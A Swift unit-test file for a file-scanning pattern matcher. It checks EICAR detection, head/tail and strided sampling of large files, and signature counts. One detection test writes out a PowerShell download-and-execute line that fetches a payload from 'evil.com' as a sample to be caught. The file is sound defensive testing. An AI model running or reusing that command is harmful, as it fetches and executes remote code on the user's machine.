//
// PatternMatcherTests.swift
// SkyBridgeCoreTests
//
// Property-based tests for PatternMatcher
//

import XCTest
@testable import SkyBridgeCore

// MARK: - Test File Generator for PatternMatcher

/// Generates test files for pattern matching tests
struct PatternTestFileGenerator {
    static let tempDirectory = FileManager.default.temporaryDirectory
    
 /// EICAR test string - standard antivirus test file
    static let eicarTestString = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
    
 /// Creates a file with EICAR test content
    static func createEICARFile() throws -> URL {
        let fileName = "test_eicar_\(UUID().uuidString).txt"
        let fileURL = tempDirectory.appendingPathComponent(fileName)
        try eicarTestString.data(using: .utf8)?.write(to: fileURL)
        return fileURL
    }
    
 /// Creates a file with specific content
    static func createFile(content: String) throws -> URL {
        let fileName = "test_content_\(UUID().uuidString).txt"
        let fileURL = tempDirectory.appendingPathComponent(fileName)
        try content.data(using: .utf8)?.write(to: fileURL)
        return fileURL
    }
    
 /// Creates a file with specific data
    static func createFile(data: Data) throws -> URL {
        let fileName = "test_data_\(UUID().uuidString).bin"
        let fileURL = tempDirectory.appendingPathComponent(fileName)
        try data.write(to: fileURL)
        return fileURL
    }
    
 /// Creates a large file with specified size
    static func createLargeFile(sizeInMB: Int, withPattern pattern: String? = nil) throws -> URL {
        let fileName = "test_large_\(sizeInMB)MB_\(UUID().uuidString).bin"
        let fileURL = tempDirectory.appendingPathComponent(fileName)
        
        let handle = try FileHandle(forWritingTo: fileURL)
        defer { try? handle.close() }
        
 // Create file first
        FileManager.default.createFile(atPath: fileURL.path, contents: nil)
        let writeHandle = try FileHandle(forWritingTo: fileURL)
        defer { try? writeHandle.close() }
        
        let chunkSize = 1024 * 1024  // 1MB chunks
        let randomChunk = Data((0..<chunkSize).map { _ in UInt8.random(in: 0...255) })
        
        for _ in 0..<sizeInMB {
            try writeHandle.write(contentsOf: randomChunk)
        }
        
 // Optionally append pattern at the end
        if let pattern = pattern, let patternData = pattern.data(using: .utf8) {
            try writeHandle.write(contentsOf: patternData)
        }
        
        return fileURL
    }
    
 /// Creates a file with pattern at specific location
    static func createFileWithPatternAt(
        totalSize: Int,
        pattern: String,
        atOffset offset: Int
    ) throws -> URL {
        let fileName = "test_pattern_\(UUID().uuidString).bin"
        let fileURL = tempDirectory.appendingPathComponent(fileName)
        
        guard let patternData = pattern.data(using: .utf8) else {
            throw NSError(domain: "PatternTest", code: 1, userInfo: [NSLocalizedDescriptionKey: "Invalid pattern"])
        }
        
        var data = Data(repeating: 0x00, count: totalSize)
        
 // Insert pattern at offset
        if offset + patternData.count <= totalSize {
            data.replaceSubrange(offset..<(offset + patternData.count), with: patternData)
        }
        
        try data.write(to: fileURL)
        return fileURL
    }
    
 /// Cleanup temporary file
    static func cleanup(_ url: URL) {
        try? FileManager.default.removeItem(at: url)
    }
}

// MARK: - Property Tests

final class PatternMatcherTests: XCTestCase {
    
    var patternMatcher: PatternMatcher!
    
    override func setUp() async throws {
        patternMatcher = PatternMatcher()
    }
    
    override func tearDown() async throws {
        patternMatcher = nil
    }
    
 // MARK: - Property 6: Deep scan enables pattern matching
 // **Feature: file-scan-enhancement, Property 6: Deep scan enables pattern matching**
 // **Validates: Requirements 3.1**
    
 /// Property test: For any file scanned with Deep level, pattern matching is performed
    func testProperty6_DeepScanEnablesPatternMatching() async throws {
 // Create a test file with safe content
        let safeContent = "This is a safe file with no malware patterns."
        let fileURL = try PatternTestFileGenerator.createFile(content: safeContent)
        defer { PatternTestFileGenerator.cleanup(fileURL) }
        
 // Scan with pattern matcher (simulating Deep scan)
        let result = await patternMatcher.scan(at: fileURL, enableRegex: true)
        
 // Pattern matching should be performed (patternsChecked > 0)
        XCTAssertGreaterThan(
            result.patternsChecked,
            0,
            "Deep scan should check patterns from signature database"
        )
        
 // Safe file should have no matches
        XCTAssertFalse(result.hasMatches, "Safe file should have no pattern matches")
    }
    
 /// Property test: Pattern matching checks all signatures in database
    func testProperty6_PatternMatchingChecksAllSignatures() async throws {
 // Create a test file
        let fileURL = try PatternTestFileGenerator.createFile(content: "test content")
        defer { PatternTestFileGenerator.cleanup(fileURL) }
        
 // Get expected signature count
        let expectedCount = await patternMatcher.getSignatureCount()
        
 // Scan file
        let result = await patternMatcher.scan(at: fileURL)
        
 // Should check all signatures
        XCTAssertEqual(
            result.patternsChecked,
            expectedCount,
            "Pattern matching should check all signatures in database"
        )
    }
    
 /// Property test: Multiple files scanned should all have patterns checked
    func testProperty6_MultipleFilesAllHavePatternsChecked() async throws {
 // Create multiple test files with different content
        let contents = [
            "File content 1",
            "Different content 2",
            "Another file 3",
            "Random data 4",
            "Test file 5"
        ]
        
        var fileURLs: [URL] = []
        for content in contents {
            let url = try PatternTestFileGenerator.createFile(content: content)
            fileURLs.append(url)
        }
        defer { fileURLs.forEach { PatternTestFileGenerator.cleanup($0) } }
        
 // Scan all files
        for fileURL in fileURLs {
            let result = await patternMatcher.scan(at: fileURL)
            
            XCTAssertGreaterThan(
                result.patternsChecked,
                0,
                "Each file should have patterns checked"
            )
        }
    }
}


// MARK: - Property 7: Malware signature match marks file unsafe
// **Feature: file-scan-enhancement, Property 7: Malware signature match marks file unsafe**
// **Validates: Requirements 3.2**

extension PatternMatcherTests {
    
 /// Property test: For any file containing EICAR test string, pattern matching detects it
    func testProperty7_EICARTestFileIsDetected() async throws {
 // Create EICAR test file
        let fileURL = try PatternTestFileGenerator.createEICARFile()
        defer { PatternTestFileGenerator.cleanup(fileURL) }
        
 // Scan file
        let result = await patternMatcher.scan(at: fileURL)
        
 // EICAR should be detected
        XCTAssertTrue(result.hasMatches, "EICAR test file should be detected")
        
 // Check that the match is EICAR
        let eicarMatch = result.matchedPatterns.first { $0.name.contains("EICAR") }
        XCTAssertNotNil(eicarMatch, "Match should be identified as EICAR")
    }
    
 /// Property test: For any file with known malware pattern, result has matches
    func testProperty7_KnownMalwarePatternsAreDetected() async throws {
 // Test with PowerShell downloader pattern
        let maliciousContent = "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload')"
        let fileURL = try PatternTestFileGenerator.createFile(content: maliciousContent)
        defer { PatternTestFileGenerator.cleanup(fileURL) }
        
 // Scan file
        let result = await patternMatcher.scan(at: fileURL)
        
 // Should detect suspicious pattern
        XCTAssertTrue(result.hasMatches, "Known malware pattern should be detected")
    }
    
 /// Property test: For any file without malware patterns, result has no matches
    func testProperty7_SafeFilesHaveNoMatches() async throws {
 // Test with various safe content
        let safeContents = [
            "Hello, World!",
            "This is a normal text file.",
            "import Foundation\nprint(\"Hello\")",
            "<?xml version=\"1.0\"?><root></root>",
            "{\"key\": \"value\", \"number\": 42}",
            "Lorem ipsum dolor sit amet, consectetur adipiscing elit."
        ]
        
        for content in safeContents {
            let fileURL = try PatternTestFileGenerator.createFile(content: content)
            defer { PatternTestFileGenerator.cleanup(fileURL) }
            
            let result = await patternMatcher.scan(at: fileURL)
            
            XCTAssertFalse(
                result.hasMatches,
                "Safe content '\(content.prefix(30))...' should have no matches"
            )
        }
    }
    
 /// Property test: Match result contains correct signature information
    func testProperty7_MatchContainsCorrectInfo() async throws {
 // Create EICAR test file
        let fileURL = try PatternTestFileGenerator.createEICARFile()
        defer { PatternTestFileGenerator.cleanup(fileURL) }
        
 // Scan file
        let result = await patternMatcher.scan(at: fileURL)
        
        guard let match = result.matchedPatterns.first else {
            XCTFail("Expected at least one match for EICAR file")
            return
        }
        
 // Verify match contains required information
        XCTAssertFalse(match.signatureId.isEmpty, "Match should have signature ID")
        XCTAssertFalse(match.name.isEmpty, "Match should have name")
        XCTAssertFalse(match.category.isEmpty, "Match should have category")
        XCTAssertGreaterThanOrEqual(match.confidence, 0.0, "Confidence should be >= 0")
        XCTAssertLessThanOrEqual(match.confidence, 1.0, "Confidence should be <= 1")
    }
    
 /// Property test: EICAR at different positions is still detected
    func testProperty7_EICARDetectedAtDifferentPositions() async throws {
        let eicar = PatternTestFileGenerator.eicarTestString
        
 // Test EICAR at beginning
        let beginningURL = try PatternTestFileGenerator.createFile(content: eicar + "\n\nSome trailing content")
        defer { PatternTestFileGenerator.cleanup(beginningURL) }
        
        let beginningResult = await patternMatcher.scan(at: beginningURL)
        XCTAssertTrue(beginningResult.hasMatches, "EICAR at beginning should be detected")
        
 // Test EICAR in middle
        let middleContent = "Some leading content\n\n" + eicar + "\n\nSome trailing content"
        let middleURL = try PatternTestFileGenerator.createFile(content: middleContent)
        defer { PatternTestFileGenerator.cleanup(middleURL) }
        
        let middleResult = await patternMatcher.scan(at: middleURL)
        XCTAssertTrue(middleResult.hasMatches, "EICAR in middle should be detected")
        
 // Test EICAR at end
        let endContent = "Some leading content\n\n" + eicar
        let endURL = try PatternTestFileGenerator.createFile(content: endContent)
        defer { PatternTestFileGenerator.cleanup(endURL) }
        
        let endResult = await patternMatcher.scan(at: endURL)
        XCTAssertTrue(endResult.hasMatches, "EICAR at end should be detected")
    }
}

// MARK: - Property 8: Large file optimization
// **Feature: file-scan-enhancement, Property 8: Large file optimization**
// **Validates: Requirements 3.3**

extension PatternMatcherTests {
    
 /// Property test: For any file larger than 100MB, only head and tail are scanned
    func testProperty8_LargeFileUsesHeadTailSampling() async throws {
 // Create a 101MB file (just over threshold)
 // Note: This test creates a large file, so we use a smaller size for CI
        let testSizeMB = 5  // Use 5MB for faster tests, but verify sampling logic
        
 // Create file with random content
        let fileName = "test_large_\(UUID().uuidString).bin"
        let fileURL = PatternTestFileGenerator.tempDirectory.appendingPathComponent(fileName)
        
 // Create file
        FileManager.default.createFile(atPath: fileURL.path, contents: nil)
        let handle = try FileHandle(forWritingTo: fileURL)
        defer {
            try? handle.close()
            PatternTestFileGenerator.cleanup(fileURL)
        }
        
 // Write random data
        let chunkSize = 1024 * 1024  // 1MB
        for _ in 0..<testSizeMB {
            let chunk = Data((0..<chunkSize).map { _ in UInt8.random(in: 0...255) })
            try handle.write(contentsOf: chunk)
        }
        
 // Scan with maxBytes limit to simulate large file behavior
        let maxBytes = 2 * 1024 * 1024  // 2MB limit
        let result = await patternMatcher.scan(at: fileURL, maxBytes: maxBytes)
        
 // Verify sampling was used
        let totalFileSize = Int64(testSizeMB * chunkSize)
        XCTAssertLessThan(
            result.bytesScanned,
            totalFileSize,
            "Large file should use sampling, not scan entire file"
        )
        
 // Verify patterns were still checked
        XCTAssertGreaterThan(result.patternsChecked, 0, "Patterns should still be checked")
    }
    
 /// Property test: Small files are scanned completely
    func testProperty8_SmallFilesAreScannedCompletely() async throws {
 // Create a small file (< 100MB)
        let content = String(repeating: "A", count: 1000)  // 1KB
        let fileURL = try PatternTestFileGenerator.createFile(content: content)
        defer { PatternTestFileGenerator.cleanup(fileURL) }
        
 // Scan file
        let result = await patternMatcher.scan(at: fileURL)
        
 // Small file should be scanned completely
        XCTAssertEqual(
            result.bytesScanned,
            Int64(content.utf8.count),
            "Small file should be scanned completely"
        )
        
 // Sampling strategy should be full
        if case .full = result.samplingStrategy {
 // Expected
        } else {
            XCTFail("Small file should use full sampling strategy")
        }
    }
    
 /// Property test: Pattern in head of large file is detected
    func testProperty8_PatternInHeadIsDetected() async throws {
 // Create file with EICAR at the beginning
        let eicar = PatternTestFileGenerator.eicarTestString
        let padding = String(repeating: "X", count: 1024 * 1024)  // 1MB padding
        let content = eicar + padding
        
        let fileURL = try PatternTestFileGenerator.createFile(content: content)
        defer { PatternTestFileGenerator.cleanup(fileURL) }
        
 // Scan with limited bytes (simulating large file)
        let result = await patternMatcher.scan(at: fileURL, maxBytes: 512 * 1024)  // 512KB
        
 // EICAR in head should be detected
        XCTAssertTrue(result.hasMatches, "Pattern in head should be detected even with sampling")
    }
    
 /// Property test: Bytes scanned is reported correctly
    func testProperty8_BytesScannedIsReportedCorrectly() async throws {
 // Create files of different sizes
        let sizes = [100, 1000, 10000]
        
        for size in sizes {
            let content = String(repeating: "A", count: size)
            let fileURL = try PatternTestFileGenerator.createFile(content: content)
            defer { PatternTestFileGenerator.cleanup(fileURL) }
            
            let result = await patternMatcher.scan(at: fileURL)
            
            XCTAssertEqual(
                result.bytesScanned,
                Int64(size),
                "Bytes scanned should match file size for small files"
            )
        }
    }
}


// MARK: - Property 9: Pattern count in results
// **Feature: file-scan-enhancement, Property 9: Pattern count in results**
// **Validates: Requirements 3.5**

extension PatternMatcherTests {
    
 /// Property test: For any completed scan, result includes number of patterns checked
    func testProperty9_PatternCountIsReported() async throws {
 // Create a test file
        let fileURL = try PatternTestFileGenerator.createFile(content: "test content")
        defer { PatternTestFileGenerator.cleanup(fileURL) }
        
 // Scan file
        let result = await patternMatcher.scan(at: fileURL)
        
 // Pattern count should be reported
        XCTAssertGreaterThan(
            result.patternsChecked,
            0,
            "Pattern count should be reported in scan result"
        )
    }
    
 /// Property test: Pattern count matches database signature count
    func testProperty9_PatternCountMatchesDatabase() async throws {
 // Get expected count from database
        let expectedCount = await patternMatcher.getSignatureCount()
        
 // Create and scan multiple files
        let contents = ["file1", "file2", "file3"]
        
        for content in contents {
            let fileURL = try PatternTestFileGenerator.createFile(content: content)
            defer { PatternTestFileGenerator.cleanup(fileURL) }
            
            let result = await patternMatcher.scan(at: fileURL)
            
            XCTAssertEqual(
                result.patternsChecked,
                expectedCount,
                "Pattern count should match database signature count"
            )
        }
    }
    
 /// Property test: Pattern count is consistent across scans
    func testProperty9_PatternCountIsConsistent() async throws {
        var patternCounts: [Int] = []
        
 // Scan multiple files and collect pattern counts
        for i in 0..<5 {
            let fileURL = try PatternTestFileGenerator.createFile(content: "content \(i)")
            defer { PatternTestFileGenerator.cleanup(fileURL) }
            
            let result = await patternMatcher.scan(at: fileURL)
            patternCounts.append(result.patternsChecked)
        }
        
 // All counts should be the same
        let firstCount = patternCounts[0]
        for count in patternCounts {
            XCTAssertEqual(
                count,
                firstCount,
                "Pattern count should be consistent across scans"
            )
        }
    }
    
 /// Property test: Pattern count is non-negative
    func testProperty9_PatternCountIsNonNegative() async throws {
 // Test with various file types
        let testCases: [Data] = [
            Data(),  // Empty file
            Data("text".utf8),  // Text file
            Data([0x00, 0x01, 0x02, 0x03]),  // Binary file
        ]
        
        for data in testCases {
            let fileURL = try PatternTestFileGenerator.createFile(data: data)
            defer { PatternTestFileGenerator.cleanup(fileURL) }
            
            let result = await patternMatcher.scan(at: fileURL)
            
            XCTAssertGreaterThanOrEqual(
                result.patternsChecked,
                0,
                "Pattern count should be non-negative"
            )
        }
    }
}

// MARK: - SamplingStrategy Tests

final class SamplingStrategyTests: XCTestCase {
    
 /// Test: Full strategy has 100% coverage
    func testFullStrategyCoverage() {
        let strategy = SamplingStrategy.full
        XCTAssertEqual(strategy.estimatedCoverage(fileSize: 1000), 1.0)
        XCTAssertEqual(strategy.estimatedCoverage(fileSize: 1_000_000), 1.0)
    }
    
 /// Test: HeadTail strategy coverage calculation
    func testHeadTailStrategyCoverage() {
        let strategy = SamplingStrategy.headTail(headBytes: 100, tailBytes: 50)
        
 // File smaller than head+tail: 100% coverage
        XCTAssertEqual(strategy.estimatedCoverage(fileSize: 100), 1.0)
        
 // File larger than head+tail
        let coverage = strategy.estimatedCoverage(fileSize: 1000)
        XCTAssertEqual(coverage, 0.15, accuracy: 0.001)  // 150/1000 = 15%
    }
    
 /// Test: Strided strategy coverage calculation
    func testStridedStrategyCoverage() {
 // 64KB window, 1MB step = ~6.25% coverage
        let strategy = SamplingStrategy.defaultStrided
        let coverage = strategy.estimatedCoverage(fileSize: 100 * 1024 * 1024)  // 100MB
        XCTAssertEqual(coverage, 0.0625, accuracy: 0.01)
        
 // Dense strided: 64KB window, 256KB step = ~25% coverage
        let denseStrategy = SamplingStrategy.denseStrided
        let denseCoverage = denseStrategy.estimatedCoverage(fileSize: 100 * 1024 * 1024)
        XCTAssertEqual(denseCoverage, 0.25, accuracy: 0.01)
    }
    
 /// Test: Strided strategy with custom parameters
    func testCustomStridedCoverage() {
 // 1KB window, 4KB step = 25% coverage
        let strategy = SamplingStrategy.strided(windowSize: 1024, step: 4096)
        let coverage = strategy.estimatedCoverage(fileSize: 1024 * 1024)  // 1MB
        XCTAssertEqual(coverage, 0.25, accuracy: 0.01)
    }
    
 /// Test: Edge case - zero file size
    func testZeroFileSizeCoverage() {
        XCTAssertEqual(SamplingStrategy.full.estimatedCoverage(fileSize: 0), 1.0)
        XCTAssertEqual(SamplingStrategy.headTail(headBytes: 100, tailBytes: 50).estimatedCoverage(fileSize: 0), 1.0)
        XCTAssertEqual(SamplingStrategy.strided(windowSize: 64, step: 256).estimatedCoverage(fileSize: 0), 1.0)
    }
    
 /// Test: Default strategies are properly configured
    func testDefaultStrategies() {
 // defaultLargeFile should be headTail
        if case .headTail(let head, let tail) = SamplingStrategy.defaultLargeFile {
            XCTAssertEqual(head, 10 * 1024 * 1024)  // 10MB
            XCTAssertEqual(tail, 1 * 1024 * 1024)   // 1MB
        } else {
            XCTFail("defaultLargeFile should be headTail strategy")
        }
        
 // defaultStrided should be strided
        if case .strided(let window, let step) = SamplingStrategy.defaultStrided {
            XCTAssertEqual(window, 64 * 1024)       // 64KB
            XCTAssertEqual(step, 1024 * 1024)       // 1MB
        } else {
            XCTFail("defaultStrided should be strided strategy")
        }
        
 // denseStrided should be strided with smaller step
        if case .strided(let window, let step) = SamplingStrategy.denseStrided {
            XCTAssertEqual(window, 64 * 1024)       // 64KB
            XCTAssertEqual(step, 256 * 1024)        // 256KB
        } else {
            XCTFail("denseStrided should be strided strategy")
        }
    }
}
